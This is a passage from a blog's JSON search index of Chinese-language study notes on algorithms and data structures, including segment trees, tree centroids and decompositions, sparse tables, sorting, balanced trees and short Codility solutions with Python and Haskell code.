[0,0,1,0] p = count_sort(s, len(s), list(range(len(s)))) l, levels = classify(s, p, lambda a,b: s[p[a]] != s[p[b]]) for h in filter(lambda h: (1 \u0026lt;\u0026lt; h) \u0026lt; len(s), range(len(s))): def isDiff(a,b): rhs = (l[p[a]], l[(l[a]+(1\u0026lt;\u0026lt;h))% len(s)] ) lhs = (l[p[b]], l[(l[b]+(1\u0026lt;\u0026lt;h))% len(s)] ) return rhs != lhs p_lhs = [p[i] - (1 \u0026lt;\u0026lt; h) + (len(s) if p[i] \u0026lt; (1 \u0026lt;\u0026lt; h) else 0) for i in range(len(s))] p = count_sort([l[x] for x in p_lhs], levels, p_lhs) l, levels = classify(s, p, isDiff) print(p) Ref Suffix Array\n","permalink":"https://littlebees.github.io/2021/11/suffix-array/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e記錄用\u003c/p\u003e\n\u003cp\u003eTODO: \u003ca href=\"https://sam571128.codes/2020/10/02/Suffix-Array/\"\u003e這能幹嘛\u003c/a\u003e\u003c/p\u003e","title":"suffix array"},{"content":"動機 其實線段樹的花樣很多\n基本款 每個點都放區間的\n起點 終點 總值 左右child class Node: def __init__(self,i,j,val): self.i = i self.j = j # i \u0026lt; j, always self.mid = i + (j-i) // 2 self.val = val self.left = None self.right = None 建構就是top-down去二分\n這邊可以注意的是，只要是有結合律的都可以用在segment tree!! 在此是用sum來示範\ndef build(arr,i,j): if i \u0026gt;= j: return Node(i,j,0) elif j-i == 1: return Node(i,j,arr[i]) else: mid = i + (j-i) // 2 root = Node(i,j,\u0026#39;wait for left and right\u0026#39;) root.left = build(arr, i, mid) root.right = build(arr, mid, j) root.val = root.left.val + root.right.val return root query根據node的中點分成3個case\n完全在左 完全在右 卡在中間 剩下就是非法range與剛好是這個node的range\ndef query(root,i,j): if not root or i \u0026lt; 0 or j \u0026lt; 0: return 0 if i == root.i and root.j == j: return root.val elif j \u0026lt; root.mid: return query(root.left, i, j) elif i \u0026gt; root.mid: return query(root.right, i ,j) else: return query(root.left, i, root.mid)+query(root.right, root.mid, j) 如果說要改其中一個index的值就有點麻煩\n因為要把修改傳上去，所以要回傳差值\ndef update(root,i,val): if root.i == i and root.j-root.i == 1: diff = val - root.val # new - old = diff =\u0026gt; new = old + diff root.val = val return diff else: if i \u0026lt; root.mid: diff = update(root.left, i, val) else: diff = update(root.right, i, val) root.val += diff return diff 懶人標記 如果要改一個range，對每個點用單點修改，效率超低，所以要用懶人標記\n懶人標記有兩種做法，區分是會不會改到原本的資料\n原本資料不變 一次替整個range加上某個值\n因為原本的值沒有變，所以可以用一個cache存差值，之後就是在查詢時把差值加上去\nclass Node: def __init__(self,i,j,val): self.i = i self.j = j # i \u0026lt; j, always self.mid = i + (j-i) // 2 self.val = val self.left = None self.right = None self.cache = 0 def query(root,i,j): if not root or i \u0026lt; 0 or j \u0026lt; 0: return 0 else: ret = root.cache*(j-i) if i == root.i and root.j == j: ret += root.val elif j \u0026lt; root.mid: ret += query(root.left, i, j) elif i \u0026gt; root.mid: ret += query(root.right, i ,j) else: ret += query(root.left, i, root.mid)+query(root.right, root.mid, j) def update(root,i,j,val): if root.i == i and root.j == j: root.cache += val else: if i \u0026lt; root.mid: update(root.left, i, val) else: update(root.right, i, val) 改原本資料 現在變成要一次把一個range的資料都改成同一個數字\n但總不能一個一個改，所以可以在node留訊息，等之後有人經過再真的去改自己的資料，並把改變往下推\nclass Node: def __init__(self,i,j,val): self.i = i self.j = j # i \u0026lt; j, always self.mid = i + (j-i) // 2 self.val = val self.left = None self.right = None self.changed = False self.newVal = 0 def push(self): self.val = self.newVal*(j-i) self.left.changed = self.right.change = True self.left.newVal = self.right.newVal = self.newVal self.newVal, self.changed = 0, False def query(root,i,j): if not root or i \u0026lt; 0 or j \u0026lt; 0: return 0 root.push() if i == root.i and root.j == j: return root.val elif j \u0026lt; root.mid: return query(root.left, i, j) elif i \u0026gt; root.mid: return query(root.right, i ,j) else: return query(root.left, i, root.mid)+query(root.right, root.mid, j) def update(root,i,j,val): if root.i == i and root.j == j: root.newVal, root.changed = val, True else: root.push() if i \u0026lt; root.mid: update(root.left, i, val) else: update(root.right, i, val) 持久化 保留過去的版本\n在update時把經過的node都重生一遍!!\ndef update(root,i,val): if root.i == i and root.j-root.i == 1: return Node(root.i, root.j, val) else: ret = Node(root.i, root.j, \u0026#39;waiting\u0026#39;) if i \u0026lt; root.mid: ret.right, ret.left = update(root.right, i, val), root.left else: ret.left, ret.right = update(root.left, i, val), root.right ret.val = ret.left.val + ret.right.val return ret segment tree 與 binary index tree的差異 segment tree binary index tree LoC 多 少 query range a~b 1~n time complexity of building O(lg(n)) O(N) time complexity of query O(lg(n)) O(lg(n)) time complexity of update O(lg(n)) O(lg(n)) Ref Segment Tree\n","permalink":"https://littlebees.github.io/2021/11/%E7%B7%9A%E6%AE%B5%E6%A8%B9/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e其實線段樹的花樣很多\u003c/p\u003e","title":"線段樹"},{"content":"動機 紀錄\nTree 直徑 定義: 相離最遠的兩個點的距離\n走兩次DFS，一次到從這個點最遠，第二次是從最邊邊到最遠 dep = defaultdict(int) far = None def dfs(root, fa): if root: for child in [child for child in root.children if child is not fa]: dep[child] = dep[fa]+1 far = max([far, child], key=lambda x: dep[x]) dfs(child, root) dfs(root, None) dep[far] = 0 dfs(far, None) print(dep[far]) 走DFS, 紀錄每個點最高與次高的高度，兩者相加就是直徑的候選 diameter = 0 def dfs(root, fa): h1, h2 = 0, 0 if root: for child in [child for child in root.children if child is not fa]: h = dfs(child, root)+1 if h \u0026gt; h1: h1, h2 = h, h1 elif h \u0026gt; h2: h2 = h diameter = max(diameter, h1+h2) return h1 重心 重心: 對於樹上的每一個點，計算其所有子樹中最大的子樹節點數，這個值最小的點\n子樹都是指無根樹的子樹，即包括“向上”的那棵子樹，並且不包括整棵樹自身。 特性: 最多兩個點 以此點為根，每顆tree的高度不大於N/2 childs = defaultdict(int) # 所有child的子樹的size總和 weight = defaultdict(int) # 子樹中最多Node的子樹的size centroids = [] # 假設知道Node總數是N def dfs(root, fa): if root: for child in [child for child in root.children if child is not fa]: dfs(child, root) childs[root] += childs[child] weight[root] = max(weight[root], childs[child]) weight[root] = max(weight[root], N-weight[root]) if weight[root] \u0026lt;= N//2: centroids.append(root) 樹分治 (Centroid Decomposition) 讓圖的每個點都有一個parent，但parent都是用當前的重心\nfas = defaultdict(lambda x: None) sizes = defaultdict(int) def decompose(root, fa): size = getSize(root, None) centroid = getCentroid(root, None, size) fas[centroid] = fa for child in centroid.children: centroid.children.remove(child) child.children.remove(centroid) decompose(child, centroid) def getSize(root, fa): sizes[root] = 0 if root: sizes[root] += 1 for child in [child for child in root.children if child is not fa]: sizes[root] += getSize(child, root) return sizes[root] def getCentroid(root, fa, size): if not root: return None else: for child in [child for child in root.children if child is not fa]: if sizes[child] \u0026gt; size//2: return getCentroid(child, root, size) 重鏈分解 (Heavy-light decomposition) 在parent從child中挑一個size最大的child做heavy\nfas = defaultdict(lambda x: None) heavy = defaultdict(lambda x: None) sizes = defaultdict(int) def assignHeavy(root): sizes[root] = 0 if root: max_wieght = 0 for child in root.children: child_size = assignHeavy(child) sizes[root] += child_size fas[child] = root if max_wieght \u0026lt; child_size: max_wieght, heavy[root] = child_size, child return sizes[root] 之後就是走訪，先看有沒有heavy，有就先走，並assign到同一條鏈(head) 沒有heavy就開新的鏈\nheads = defaultdict(lambda x: None) def decompose(root, head): heads[root] = head if heavy[root]: decompose(heavy[root], head) isNotInHeavy = lambda child: child is not fas[root] and child is not heavy[root] for child in [child for child in root.children if isNotInHeavy(child)]: decompose(child, child) Q: 這能幹嘛? A: 這裡\n圖 直徑 偏心距: 以最短路徑長度當作距離，找出離此點最遠的一點的距離 直徑: 圖上所有偏心距當中最大的一個\n半徑: 圖上所有偏心距當中最小的一個 找所有點的到別的點的最短距離，之後就是找每一點的偏心距，之後就是照定義\n// Floyd-Warshall Algorithm for (int k=0; k\u0026lt;10; ++k) for (int i=0; i\u0026lt;10; ++i) for (int j=0; j\u0026lt;10; ++j) d[i][j] = min(d[i][j], d[i][k] + d[k][j]); // 計算偏心距 memset(ecc, 0x7f, sizeof(ecc)); for (int i=0; i\u0026lt;10; ++i) for (int j=0; j\u0026lt;10; ++j) ecc[i] = min(ecc[i], d[i][j]); // 計算直徑和半徑 int diameter = 0; int radius = 1e9; for (int i=0; i\u0026lt;10; ++i) { diameter = max(diameter, ecc[i]); radius = min(radius , ecc[i]); } 重心 計算每個點有多少點指到(入度)，之後就是用bfs把入度為0的node放到queue\n在bfs中移除node，更新移除後的入度，把入度為0的node放到queue\n等結束後，確認剩下最多兩個node\nRef 树的直径 树的重心 演算法筆記 Path A Visual Introduction to Centroid Decomposition Heavy-light decomposition 树链剖分\n","permalink":"https://littlebees.github.io/2021/11/%E6%A8%B9%E8%88%87%E5%9C%96%E7%9A%84%E9%87%8D%E5%BF%83%E7%9B%B4%E5%BE%91/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e紀錄\u003c/p\u003e","title":"樹與圖的重心、直徑"},{"content":"動機 時不時看到，來搞懂他\n做N次直接乘N? 以一般的雙loop，就是第一個loop乘上N就是N^2\n因為裡面的loop都是N，但是如果不是每次都是N的話?\n平攤分析 有些操作他有worst case與一般case，同時又會跑不特定多次，像online algorithm，如果要計算他操作的成本，只看worst case不太好，應該要算跑好幾次的平均成本\n這就是平攤分析，簡單來說就是算平均\n最簡單的做法是計算累積的成本，之後除總次數\n像stack，一定是要先push，push是常數要N次，所以總成本就是N 就算mutil-pop(可以一次pop很多)的worst case是N，但是因為stack的總成本，能給mutil-pop的總成本是N，所以用平攤分析，mutil-pop是常數\n還有其他分析法，但重點都是算 總成本 與 總次數\n像是位能法的push的平攤成本為什麼是2? 因為做了這個操作才能，讓pop或是mutil-pop做事\nRef Amortized analysis\n","permalink":"https://littlebees.github.io/2021/11/%E5%B9%B3%E6%94%A4%E5%88%86%E6%9E%90/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e時不時看到，來搞懂他\u003c/p\u003e","title":"平攤分析"},{"content":"動機 記錄用\n區間問題是? 就是給個數列，之後做 修改、查詢\n不論修改、查詢都可以做 單點、範圍\n分類 區間修改、區間查詢：線段樹 + 懶人標記 區間修改、單點查詢：BIT + 差分 單點修改、區間查詢：線段樹／BIT 區間修改、沒有查詢：差分 沒有修改、區間查詢：前綴和／稀疏表 差分 做很多次區間修改，之後一直查詢\n有沒有一種方法可以讓修改影響到右邊的數字? 這就要提到差分的特性。\n差分定義成D_i = A_i - A_i-1\n根據上面的定義可以看到如果sum(D[x] for x in range(i))，就會是A_i，因為其他值會被差分扣掉\n所以只要D_i的其中一個有被加新數字，就會影響到這個數字!!\n這樣如果要修改range([l,r))就是D_l + diff 與 D_r - diff，之後做prefix sum就能回答了!!\n離散化 之前有提到分塊，也就是把資料分組\n離散化就是把資料再細分，像是如果數字有重複，就依據原本的位置再上新的編號\nLCA 與 Range Minimum Query 如果把一顆tree用dfs走一遍，並在每一次遇到時記下點的編號 並把第一次的編號當成該點的position\nidx = [] pos = {} acc = 0 def dfs(root): if root: idx.append(acc) pos[root] = acc if root not in pos else pos[root] [dfs(child) for child in root.children] 那這樣LCA就是在idx中pos[a] ~ pos[b]範圍的最小值，因為從a到b一定會過LCA，同時LCA也是pos最小的!!\nRef 區間問題概述 最近公共祖先\n","permalink":"https://littlebees.github.io/2021/11/%E5%8D%80%E9%96%93%E5%95%8F%E9%A1%8C/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e記錄用\u003c/p\u003e","title":"區間問題"},{"content":"動機 為什麼能倍增? 將2的次冪排成一個序列，即1,2,4,8,16,32\u0026hellip;\u0026hellip;在這個序列中取任意個不相等的數，相加可以得到所有正整數\nSparse Table 定義st[i][j] =\u0026gt; [i, i+2^j -1]這是閉區間\n之後把這個range二分，[i, i+2^(j-1)-1] [i+2^(j-1), i+2^(j-1)-1] st[i][j] = st[i][j-1] + st[i+2^(j-1)][j-1]\nfrom math import log2 def make_st(arr): st = {} K = log2(len(arr)) for i,n in enumerate(arr): st[(i, 0)] = n for j in range(1,K+1): for i in filter(lambda i: i+(1 \u0026lt;\u0026lt; j) \u0026lt;= len(arr), range(len(arr))): st[(i,j)] = st[(i, j-1)] + st[(i+(1 \u0026lt;\u0026lt; (j-1)), j-1)] return [K, st] 只要是有結合律的函數(+, min, max)都可以用ST或是線段樹，之類可以作區間操作的DS\nLCA 定義grand[i][j]為節點i高2^j個level的祖先\n那這要怎麼遞迴定義? 二分 所以用2^j-1去分，所以先跳到2^j-1，再往上跳2^j-1\ngrand[i][j] = grand[grand[i][j-1]][j-1]\nfrom collections import defaultdict from math import log2, ceil def build(tree): grand = defaultdict(lambda x: None) dep = defaultdict(int) dep[None] = -1 def dfs(root, parent=None): if root: grand[(root, 0)] = parent dep[root] += dep[parent]+1 j = 1 while (1 \u0026lt;\u0026lt; j) \u0026lt;= dep[root]: grand[(root, j)] = grand[(grand[(root,j-1)], j-1)] j += 1 dfs(root.left) dfs(root.right) dfs(tree) return [dep, grand] 之後的查詢就是\n先把兩個調到一樣高 從最大的2次方去試，直到兩邊相遇 dep, grand = build(tree) def lca(a, b): if dep[b] \u0026lt; dep[a]: return lca(b, a) else: K = ceil(log2(len(dep.keys()))) for j in reversed(range(K+1)): if dep[b]-(1 \u0026lt;\u0026lt; j) \u0026gt;= dep[a]: b = grand[(b, j)] if a is b: return a else: for j in reversed(range(K+1)): if grand[(b, j)] is not grand[(a, j)]: a, b = grand[(a, j)], grand[(b, j)] return grand[(a, 0)] Ref sparse-table LCA问题（倍增法）\n","permalink":"https://littlebees.github.io/2021/11/%E5%80%8D%E5%A2%9E%E6%80%9D%E7%B6%AD/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e","title":"倍增思維"},{"content":"動機 記錄用\n分塊 通過對原數據的適當劃分，並在劃分後的每一個塊上預處理部分信息(像是sum，還可以附加訊息，像是懶標)，從而較一般的暴力算法取得更優的時間複雜度。\n分塊的時間複雜度主要取決於分塊的塊長，一般可以通過均值不等式求出某個問題下的最優塊長，以及相應的時間複雜度。\nSqrt Decomposition 每一格用根號長度去分組，這樣q次query的整體複雜度就是O(n+q*sqrt(n))\n為什麼是根號? 一次query要花O(n/size + size)，n/size是走了幾個完整的塊，size是剩下的item\n而這與算幾不等式很像，所以要讓n/size = size，那size就是根號\n算幾不等式\ntmp = n/size (tmp+size) / 2 \u0026gt;= sqrt(tmp*size) def sqrt_decomposition(arr): import math ret = [] size = math.floor(math.sqrt(len(arr))) for i,n in enumerate(arr): if len(ret) \u0026lt;= i//size: ret.append(0) ret[-1] += n return [ret, size] b, size = sqrt_decomposition(arr) def answer(i,j): b_i, b_j = i//size, j//size if b_i == b_j: # 在同一區 return sum(arr[i:j]) else: # i ... b_i_end b_i+1_start b_i+1_end ... b_i+2_start ...... b_j_start ... j # b_i*size+size: b_i*size還是在 i 所在的區域，所以再加一個size，跳到下一格 return sum(arr[i:(b_i*size+size)])+sum(b[b_i+1:b_j])+sum(arr[b_j*size:j]) TODO: Mo\u0026rsquo;s algorithm\nbucket sort 把數字分到各個桶子中\ndef bucket(arr): but = [[] for _ in range(min(arr), max(arr))] [but[n-min(arr)].append(n) for n in arr] ret = [] for i in range(len(but)): [ret.append(x) for x in but[i] if but[i]] return ret worst time comp: O(讀len(arr)元素^2) (如果全部都在同一個bucket，並用insert sort去sort bucket的元素) avg time comp: O(讀len(arr)元素 + bucket的長度)\n現在是一個數字對到一個index，但事實上可以讓一個range的數字對到一個index，這樣就有趣了\ncounting sort 計數 算prefix sum，就是看這個數字要有前面已經被占了多少格 開始放，放完就在原本的prefix sum上加一 def counting(arr): cnts = [0 for _ in range(min(arr), max(arr))] # count for n in arr: cnts[n-min(arr)] += 1 # prefix sum for i in range(1,len(cnts)): cnts[i] += cnts[i-1] # place each element ret = list(arr) for n in arr: ret[n-min(arr)] = cnts[n-min(arr)] cnts[n-min(arr)] += 1 return ret time comp: O(讀len(arr)元素 + prefix sum的長度)\nradix sort 每次用一個位數digit去sort，如果位數不存在就當0，sort到最後就是radix sort\n有趣的是，如果從最右邊(LSM，最小位數)開始走就是一般的sort，但如果從最左邊(MSM，最大位數)開始走就變成字典序!! 126與8\ntime comp: O(幾個位數 * O(counting sort))\nRef 分塊法 分块思想 Sqrt Decomposition\n","permalink":"https://littlebees.github.io/2021/11/%E5%88%86%E5%A1%8A%E6%80%9D%E6%83%B3/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e記錄用\u003c/p\u003e","title":"分塊思想"},{"content":"動機 補完以前的記憶，下面會介紹\n經典款: red-black tree 但在面試或是競賽馬上code出來應該有點難，所以通常用下面兩種 rotation base: splay tree merge/split base: treap red-black tree 只要符合下面兩個限制的tree就是red-black tree\n紅的不會和紅的接在一起 雙紅矛盾 從根到任意leaf的路徑長度都一樣長 黑高矛盾 (不等高) insert (雙紅矛盾) insert如何不破壞兩個條件?\n黑高矛盾: 每次都插入紅的 雙紅矛盾:\n插入點是root，child有紅 把root換成黑 插入點是child (parent是黑的，並假設插在左邊) 左的child是紅的: 直接右旋 右的child是紅的: 左旋再右旋 插右邊的case? 這是對稱的，所以不列了\n可以注意到，第2個case的所有case的結果都會是\n根是紅的 像這種/\\形狀 剛剛提到左旋與右旋，來完成再平衡，但是haskell可以直接build資料，所以\u0026hellip;\nblacken Nil = Nil blacken (Node _ value left right) = Node Black value left right insert x root = blacken $ insert\u0026#39; root where insert\u0026#39; Nil = Node Red x Nil Nil insert\u0026#39; root@(Node color y left right) | x \u0026lt; y = balance color y (insert\u0026#39; left) right | x \u0026gt; y = balance color y left (insert\u0026#39; right) | otherwise = root -- left-right balance Black z (Node Red x a (Node Red y b c)) d = Node Red y (Node Black x a b) (Node Black z c d) -- left-left balance Black z (Node Red y (Node Red x a b) c) d = Node Red y (Node Black x a b) (Node Black z c d) -- right-left balance Black x a (Node Red y b (Node Red z c d)) = Node Red y (Node Black x a b) (Node Black z c d) -- right-right balance Black x a (Node Red z (Node Red y b c) d) = Node Red y (Node Black x a b) (Node Black z c d) balance color value left right = Node color value left right delete (黑高矛盾) delete就是BST的delete\n在leaf: 換成nil 只有一個child: 把唯一個child拉上去 兩個child: 右child最小的換上來，再把它刪掉 所以現在重點是換下去的那個點怎麼刪\n刪的是\n紅的: 沒事 黑的: 數量可能不對 (黑高矛盾) (把紅的看成收束下面的兩個child成一條長度，因為兩邊的長度一樣) (紅的可以輕易變成黑的，但黑的不行直接變成紅的) 要刪的是黑的，所以可以從parent與neighbor的顏色生出4種case\nroot: red root: black neighbor: red impossible 左旋，原本的parent變紅 neighbor: black 原本的parent變黑，neighbor變紅 neighbor變紅 neighbor變紅，不會觸發雙紅矛盾? 有可能，如果兩個child都是黑的就沒事，其中一個是紅的就要處理了\n只有右邊是紅、兩個紅: 左旋 (把長度補回去)，把紅的標成黑 只有左邊是紅: 先左旋，轉成一條就可以用前面的方法了 isBlack (Node Red _ _ _) = False isBlack _ = True balL color y (left, True) right = (Node color y left right, True) balL color y (left, False) right = balL\u0026#39; color y left right balL\u0026#39; color1 p n (Node color2 s sl sr) -- neighbor: red, root: black | color2 == Red = balL Black s (balL\u0026#39; Red p n sl) sr -- neighbor: black, root: black OR red | isBlack sl \u0026amp;\u0026amp; isBlack sr = (Node Black p n (Node Red s sl sr), color1 == Red) -- 只有右邊是紅、兩個紅 | not (isBlack sr) = (Node color1 s (Node Black p n sl) (blacken sr), True) -- 只有左邊是紅 | otherwise = let (Node Red x sll slr) = sl in balL\u0026#39; color1 p n (Node Black x sll (Node Red s slr sr)) 把剩下的列完\nfindMin (Node _ x Nil _) = x findMin (Node _ _ left _) = findMin left balR color y left (right, True) = (Node color y left right, True) balR color y left (right, False) = balR\u0026#39; color y left right balR\u0026#39; color1 p (Node color2 s sl sr) n | color2 == Red = balR Black s sl (balR\u0026#39; Red p sr n) | isBlack sl \u0026amp;\u0026amp; isBlack sr = (Node Black p (Node Red s sl sr) n, color1 == Red) | not (isBlack sl) = (Node color1 s (blacken sl) (Node Black p sr n), True) | otherwise = let (Node Red x srl srr) = sr in balR\u0026#39; color1 p (Node Black x (Node Red s sl srl) srr) n delete x t = fst $ delete\u0026#39; x t where delete\u0026#39; x Nil = (Nil, True) delete\u0026#39; x root@(Node color y left right) | x \u0026lt; y = balL color y (delete\u0026#39; x left) right | x \u0026gt; y = balR color y left (delete\u0026#39; x right) | otherwise = deleteRoot root deleteRoot (Node color _ Nil Nil) = (Nil, color == Red) deleteRoot (Node _ _ left Nil) = (blacken left, True) deleteRoot (Node _ _ Nil right) = (blacken right, True) deleteRoot (Node color _ left right) = let m = findMin right in balR color m left (delete\u0026#39; m right) Ref 有人能讲清楚《Algorithms》中左倾红黑树（LLRB）删除操作的每一行代码吗？\nsplay tree 利用特別的旋轉(splay)，把最近存取的點轉到root，達成所有操作均攤log n\n如果只有父節點，也就是父節點是root，就直接rotate 但如果有祖父節點時要做下面兩個case的旋轉\nQ: 為什麼這個rotate這麼特別，如果說只是轉上去，其實不用管祖父節點? A: 這樣才能確保出來的深度是最小的\nP.S.: C++的rotate很複雜，因為一次只能assign一次，所以狀態一直變，但是利用平行賦值就好很多\n每次改node，都要確認被改過的node的left, right, parent都是對的!!\nclass Node: def __init__(self, key:int = 0, parent = None, left = None, right = None): self.key, self.parent, self.left, self.right = key, paretn, left, right def left_rotate(self): oldroot, newroot = self, self.left newroot.parent, oldroot.parent = oldroot.parent, newroot newroot.right, oldroot.left = oldroot, newroot.right if newroot.left: newroot.left.parent = oldroot if newroot.parent: if newroot.parent.left is oldroot: newroot.parent.left = newroot else: newroot.parent.right = newroot def right_rotate(self): oldroot, newroot = self, self.right newroot.parent, oldroot.parent = oldroot.parent, newroot newroot.left, oldroot.right = oldroot, newroot.right if newroot.right: newroot.right.parent = oldroot if newroot.parent: if newroot.parent.left is oldroot: newroot.parent.left = newroot else: newroot.parent.right = newroot def is_left(self, other): return self.left is other def splay(self): while self.parent: parent, grand_parent = self.parent, self.parent.parent if grand_parent: if grand_parent.is_left(self.parent): if left_child: grand_parent.left_rotation() parent.left_rotation() else: parent.right_rotation() grand_parent.left_rotation() else: if not left_child: # is right child grand_parent.right_rotation() parent.right_rotation() else: parent.left_rotation() grand_parent.right_rotation() else: # zig if parent.left is self: parent.left_rotate() else: parent.right_rotate() def find(self, key: int) -\u0026gt; Node: ret = None if self.key == key: ret = self elif self.right and self.key \u0026lt; key: ret = self.right.find(key) elif self.left and self.key \u0026gt; key: ret = self.left.find(key) return ret def find_min(self): return self.left.find_min() if self.left else self.key insert與BST差不多，但是最後要splay!!\ndef insert(root: Node, key: int): ## WTF prev: Node, now: Node = None, root while now: prev, now = now, now.right if now.key \u0026lt; key else now.left now = Node(key, prev) if prev.key \u0026lt; now.key: prev.right = now else: prev.left = now now.splay() 基本就是BST的remove，但要先把target splay，再做BST的remove\ndef remove(root, key): ## WTF target: Node = root.find(key) def take_place(a, b): if b: b.parent = a.parent if a.parent: if a.parent.left is a: a.parent.left = b else: a.parent.right = b if target: target.splay() if not target.left: take_place(target, target.right) elif not target.right: take_place(target, target.left) else: miniumum = target.right.find_min() if miniumum.parent is not target: take_place(miniumum, miniumum.right) miniumum.right = target.right miniumum.right.parent = miniumum take_place(target, miniumum) miniumum.left = target.left del target Ref\ntreap 每個點都有\nkey: BST的val pri: heap的比較數字 所以叫tree + heap = treap 在維持heap的前提下(意思是heap先滿足)，滿足BST的需求\n同時treap有以下性質\n給定 n 個節點的 key、pri 的大小關係，那麼這棵 treap 的形狀唯一。 給定 n 個節點的 key，在 n 個節點的 pri 都隨機的前提下（也就是 treap 的形狀隨 機），任一個選定的節點的期望深度為 O(log n)。 所以根據第2點，我們pri要是random\nclass Node: def __init__(self, key: int = 0, left = None, right = None): self.left, self.right = left, right self.key, self.pri = key, random() def inspect(self) -\u0026gt; [int]: ret = [self.key] ret += self.left.inspect() if self.left else [] ret += self.right.inspect() if self.right else [] return ret def size(self) -\u0026gt; int: ret = 1 ret += self.left.size() if self.left else 0 ret += self.right.size() if self.right else 0 return ret 有rotate的寫法，但很複雜，同時有merge/split的寫法，好寫很多，所以做merge/split\nsplit: 把一顆樹根据數字分成左右兩顆treap\nroot key比較小就跟左邊、比較大就跟右邊，剩下的(另一側)拿去遞迴，繼續割 merge: 依據pri與key合併兩棵treap 同時限制左邊的treap的所有key都小於右邊的treap 只要是合併split後的treap就可以滿足這個限制 merge/split互為反函數 def split(root: Node, key: int) -\u0026gt; [Node, Node]: if not root: return [None, None] elif root.key \u0026lt;= key: # 保留 root.left # 繼續分 root.right，之後接上新的treap l, r = split(root.right, key) root.right = l return [root, r] else: l, r = split(root.left, key) root.left = r return [l, root] def merge(l: Node, r: Node) -\u0026gt; Node: if not l or not r: return l or r elif l.pri \u0026gt; r.pri: l.right = merge(l.right, r) return l # 讓pri大的當root else: r.left = merge(l, r.left) return r # 讓pri大的當root insert:\n基本上就是BST insert，但是還有pri!! 所以可以先看pri，如果比較大就插這裡 (用split生左右tree!!) def insert(root: Node, target: Node): if not root: return target elif target.pri \u0026gt; root.pri: target.left, target.right = split(root, target.key) return target else: # usual BST insert if root.key \u0026lt;= target.key: return insert(root.right, target) else: return insert(root.left, target) remove:\n遠比BST的remove簡單!! 遇到要刪的，直接merge原有的左右tree!! def remove(root: Node, key: int) -\u0026gt; Node: if not root: return None elif root.key == key: return merge(root.left, root.right) else: if root.key \u0026lt;= key: root.right = remove(root.right, key) else: root.left = remove(root.left, key) return root 這個是set的union，作法就是用最大pri的treap作主軸，一直split右邊的treap，之後就是繼續unite被split出來的treap\ndef unite(l: Node, r: Node) -\u0026gt; Node: if not l or not r: return l or r elif l.pri \u0026lt; r.pri: return unite(r, l) else: r_left, r_right = split(r, l.key) l.left = unite(l.left, r_left) l.right = unite(l.right, r_right) return l Ref\n","permalink":"https://littlebees.github.io/2021/11/%E5%90%84%E7%A8%AE%E5%B9%B3%E8%A1%A1%E6%A8%B9/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e補完以前的記憶，下面會介紹\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e經典款: red-black tree\n\u003cul\u003e\n\u003cli\u003e但在面試或是競賽馬上code出來應該有點難，所以通常用下面兩種\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003erotation base: splay tree\u003c/li\u003e\n\u003cli\u003emerge/split base: treap\u003c/li\u003e\n\u003c/ul\u003e","title":"各種平衡樹"},{"content":"動機 居然有閉包!! note: cross往下是負的，cross往上是正的\nSol cross是a向量的x*b向量的y-a向量的y*b向量的x 把a向量當成基準線，cross是負的就是b向量往下轉，正的就是往上轉\n所以只要發現有向量是往下轉的就要把之前的去掉，把這個留下來\ndef cross(c, a, b): return (a.x - c.x)*(b.y - c.y) - (a.y - c.y)*(b.x - c.x) def solution(A): idx = {p:i for i,p in enumerate(A)} A.sort(key=lambda xy: xy.x) down = [] up = [] for p in A: while len(down) \u0026gt; 1 and cross(down[-2], down[-1], p) \u0026lt; 0: down.pop() down.append(p) for p in reversed(A): while len(up) \u0026gt; 1 and cross(up[-2], up[-1], p) \u0026lt; 0: up.pop() up.append(p) ans = set(range(len(A))) - set(map(lambda p: idx[p], up)) - set(map(lambda p: idx[p], down)) return next(iter(ans)) if ans else -1 ","permalink":"https://littlebees.github.io/2021/11/polygon-concavity-index/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e居然有閉包!!\nnote: cross往下是負的，cross往上是正的\u003c/p\u003e","title":"Polygon Concavity Index"},{"content":"動機 這題目有夠爛，這根本不像是找對稱點，而是確認對稱點\nSol def solution(S): if len(S) % 2 == 0 or S != S[::-1]: return -1 else: return len(S)//2 ","permalink":"https://littlebees.github.io/2021/11/str-symmetry-point/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e這題目有夠爛，這根本不像是找對稱點，而是確認對稱點\u003c/p\u003e","title":"Str-Symmetry-Point"},{"content":"動機 紀錄\nSol from collections import defaultdict def solution(A): cnts = defaultdict(int) idx = {} for i,n in enumerate(A): cnts[n] += 1 if n not in idx: idx[n] = i i = float(\u0026#39;inf\u0026#39;) for k,v in filter(lambda kv: kv[1] == 1, cnts.items()): i = min(i, idx[k]) return A[i] if i != float(\u0026#39;inf\u0026#39;) else -1 ","permalink":"https://littlebees.github.io/2021/11/first-unique/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e紀錄\u003c/p\u003e","title":"First-Unique"},{"content":"動機 紀錄\nSol def solution(T): if not T: return -1 else: return 1+max(solution(T.l), solution(T.r)) ","permalink":"https://littlebees.github.io/2021/11/tree-height/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e紀錄\u003c/p\u003e","title":"Tree-Height"},{"content":"動機 紀錄\nSol from bisect import bisect_left def merge(l): if len(l) \u0026lt; 2: return [0,l] else: a, left = merge(l[:len(l)//2]) b, right = merge(l[len(l)//2:]) ret = a+b for i in range(len(left)): ret += bisect_left(right, left[i]) return [ret, sorted(left+right)] def solution(A): ret = merge(A)[0] return ret if ret \u0026lt;= 1000000000 else -1 ","permalink":"https://littlebees.github.io/2021/11/array-inversion-count/","summary":"\u003ch2 